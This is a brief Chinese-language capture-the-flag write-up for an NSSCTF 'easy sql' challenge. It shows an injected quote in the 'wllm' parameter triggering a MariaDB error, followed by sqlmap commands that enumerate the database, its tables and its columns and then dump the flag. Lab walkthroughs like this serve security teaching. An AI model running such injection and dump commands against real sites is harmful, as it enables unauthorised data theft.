# easy sql

题目链接：https://www.nssctf.cn/problem/387



解题思路：

title显示了"参数是wllm"，因此应该这个就是可以注入的参数名。

输入：

```
http://node4.anna.nssctf.cn:28939/?wllm=1%27
```

报错：

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
```

上sqlmap，使用：

```
python sqlmap.py http://node4.anna.nssctf.cn:28939/?wllm=1%27 --current-db
```

得到数据库名：test_db

使用：

```
python sqlmap.py http://node4.anna.nssctf.cn:28939/?wllm=1%27 -D test_db --tables
```

得到表名：

```
test_tb
users
```

使用：

```
python sqlmap.py http://node4.anna.nssctf.cn:28939/?wllm=1%27 -D test_db -T test_tb --columns
```

得到列名：

```
flag
id
```

使用命令：

```
python sqlmap.py http://node4.anna.nssctf.cn:28939/?wllm=1%27 -D test_db -T test_tb -C flag --dump
```

得到flag。
